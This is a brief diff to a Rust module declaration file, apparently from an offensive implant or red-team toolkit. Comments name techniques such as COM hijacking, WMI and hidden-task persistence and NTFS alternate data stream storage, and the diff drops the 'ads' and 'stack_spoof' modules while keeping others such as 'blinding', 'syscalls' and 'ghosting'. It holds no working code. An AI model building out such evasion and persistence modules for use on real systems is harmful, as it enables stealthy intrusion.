@@ -10,11 +10,11 @@
 //! - `persistence` - COM hijacking + WMI + hidden task
 //! - `ads` - NTFS Alternate Data Streams storage
 
-pub mod ads;
+
 pub mod persistence;
 pub mod ghosting;
 pub mod obfuscation;
-pub mod stack_spoof;
+
 pub mod syscalls;
 pub mod blinding;
 pub mod registry;
